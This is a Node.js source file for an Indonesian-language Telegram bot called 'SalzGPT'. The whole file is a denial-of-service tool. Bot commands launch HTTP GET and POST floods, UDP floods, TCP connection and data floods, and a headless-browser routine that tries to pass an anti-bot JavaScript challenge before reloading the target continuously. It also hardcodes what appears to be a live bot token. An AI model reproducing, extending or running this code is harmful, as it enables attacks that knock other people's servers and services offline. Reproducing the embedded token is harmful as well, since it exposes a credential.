// SalzGPT - Node.js Telegram Bot v3.0
// Protokol Jaringan: UDP/TCP Diaktifkan

const TelegramBot = require('node-telegram-bot-api');
const dgram = require('dgram');
const net = require('net');
const http = require('http');
const crypto = require('crypto');
const puppeteer = require('puppeteer');

// --- KONFIGURASI ---
const BOT_TOKEN = "8522639108:AAGFgk9CHoKX9Owgu1sj1o9PAYZOZdDEnUI"; // Ganti dengan token bot Anda

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// --- FUNGSI SERANGAN ---

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
];
async function uamBypass(url, duration, msg) {
    const chatId = msg.chat.id;
    let browser;
    try {
        bot.sendMessage(chatId, `[UAM_BYPASS] Meluncurkan instance browser... Ini mungkin memakan waktu.`);
        browser = await puppeteer.launch({
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                 '--single-process', // Opsional, bisa membantu di lingkungan terbatas
                '--disable-gpu'
            ]
        });
        const page = await browser.newPage();
        
        bot.sendMessage(chatId, `[UAM_BYPASS] Menavigasi ke ${url} dan mencoba melewati tantangan JS...`);
        
        // Navigasi ke URL, Puppeteer akan menunggu hingga halaman dimuat (termasuk tantangan JS)
        await page.goto(url, { waitUntil: 'networkidle2', timeout: 60000 });
        
        // Cek judul halaman setelah navigasi untuk konfirmasi
        const pageTitle = await page.title();
        bot.sendMessage(chatId, `[UAM_BYPASS] Tantangan terlewati. Judul halaman target: "${pageTitle}". Memulai flood...`);
        
        const endTime = Date.now() + duration * 1000;
        
        const attackInterval = setInterval(async () => {
            if (Date.now() > endTime) {
                clearInterval(attackInterval);
                await browser.close();
                bot.sendMessage(chatId, `[UAM_BYPASS] Serangan terhadap ${url} telah selesai.`);
                return;
            }
            // Reload halaman secara terus menerus setelah tantangan dilewati
            try {
                await page.reload({ waitUntil: 'domcontentloaded' });
            } catch (reloadError) {
                // Abaikan error jika halaman gagal reload, teruskan serangan
            }
        }, 100); // Interval reload cepat

    } catch (error) {
        bot.sendMessage(chatId, `[UAM_BYPASS] Gagal: ${error.message}. Pastikan URL valid dan server dapat diakses. Mungkin perlu waktu timeout lebih lama.`);
        if (browser) {
            await browser.close();
        }
    }
}
// -- Layer 7 --
function bypass(target, port, duration) {
    const attackInterval = setInterval(() => {
        const options = {
            hostname: target, port: port, path: `/?${Math.random().toString(36).substring(2)}`, method: 'GET',
            headers: { 'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)], 'Cache-Control': 'no-cache', 'Connection': 'close' }
        };
        const req = http.request(options, (res) => {});
        req.on('error', (err) => {});
        req.end();
    });
    setTimeout(() => clearInterval(attackInterval), duration * 1000);
}

function stress(target, port, duration) {
    const attackInterval = setInterval(() => {
        const postData = crypto.randomBytes(16).toString('hex');
        const options = {
            hostname: target, port: port, path: '/', method: 'POST',
            headers: { 'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)], 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': Buffer.byteLength(postData), 'Connection': 'close' }
        };
        const req = http.request(options, (res) => {});
        req.on('error', (err) => {});
        req.write(postData);
        req.end();
    });
    setTimeout(() => clearInterval(attackInterval), duration * 1000);
}

// -- Layer 4 --
function udp(target, port, duration) {
    const client = dgram.createSocket('udp4');
    const payload = crypto.randomBytes(1024);
    const endTime = Date.now() + (duration * 1000);

    const attackInterval = setInterval(() => {
        if (Date.now() > endTime) {
            clearInterval(attackInterval);
            client.close();
            return;
        }
        client.send(payload, port, target, (err) => {});
    });
}

function tcpconn(target, port, duration) {
    const endTime = Date.now() + (duration * 1000);
    const attackInterval = setInterval(() => {
        if (Date.now() > endTime) {
            clearInterval(attackInterval);
            return;
        }
        const socket = new net.Socket();
        socket.on('error', (err) => socket.destroy());
        socket.connect(port, target, () => socket.destroy());
    });
}

function tcpdata(target, port, duration) {
    const payload = crypto.randomBytes(65535);
    const endTime = Date.now() + (duration * 1000);
    const attackInterval = setInterval(() => {
        if (Date.now() > endTime) {
            clearInterval(attackInterval);
            return;
        }
        const socket = new net.Socket();
        socket.on('error', (err) => socket.destroy());
        socket.connect(port, target, () => {

            const writeInterval = setInterval(() => {
                if (!socket.writable) { clearInterval(writeInterval); return; }
                socket.write(payload);
            }, 10);
        });
        setTimeout(() => socket.destroy(), 5000);
    });
}

// --- HANDLER PERINTAH TELEGRAM ---

bot.onText(/\/start|\/help/, (msg) => {
    const chatId = msg.chat.id;
    const response = `
[SalzGPT] Sistem Operasional v3.0. Protokol jaringan UDP/TCP telah diaktifkan.
Perintah yang tersedia:

--- Layer 7 (Aplikasi/Web) ---
/bypass <HOST/IP> <PORT> <DURASI>
   └ Menghindari cache server (GET Flood).

/stress <HOST/IP> <PORT> <DURASI>
   └ Memberi beban pada CPU server (POST Flood).

--- Layer 4 (Transportasi) ---
/udp <IP> <PORT> <DURASI>
   └ Membanjiri target dengan paket UDP.

/tcpconn <IP> <PORT> <DURASI>
   └ Membanjiri target dengan koneksi TCP.

/tcpdata <IP> <PORT> <DURASI>
   └ Mengirim data acak melalui koneksi TCP.
    `;
    bot.sendMessage(chatId, response);
});

function handleAttackCommand(msg, match, attackFunction) {
    const chatId = msg.chat.id;
    if (!match || match.length < 4) {
        bot.sendMessage(chatId, `Format parameter salah. Gunakan /help`);
        return;
    }
    const target = match[1];
    const port = parseInt(match[2]);
    const duration = parseInt(match[3]);
    
    bot.sendMessage(chatId, `[${attackFunction.name.toUpperCase()}] Inisiasi serangan terhadap ${target}:${port} selama ${duration} detik.`);
    attackFunction(target, port, duration);
}

// Handler untuk setiap perintah serangan
bot.onText(/\/bypass (\S+) (\d+) (\d+)/, (msg, match) => handleAttackCommand(msg, match, bypass));
bot.onText(/\/stress (\S+) (\d+) (\d+)/, (msg, match) => handleAttackCommand(msg, match, stress));
bot.onText(/\/udp (\S+) (\d+) (\d+)/, (msg, match) => handleAttackCommand(msg, match, udp));
bot.onText(/\/tcpconn (\S+) (\d+) (\d+)/, (msg, match) => handleAttackCommand(msg, match, tcpconn));
bot.onText(/\/tcpdata (\S+) (\d+) (\d+)/, (msg, match) => handleAttackCommand(msg, match, tcpdata));
bot.onText(/\/uam (\S+) (\d+)/, (msg, match) => {
    const url = match[1];
    const duration = parseInt(match[2]);
    uamBypass(url, duration, msg);
});


// --- Mulai Bot ---
console.log("[SalzGPT] Bot v3.0 sedang online. Menunggu perintah...");

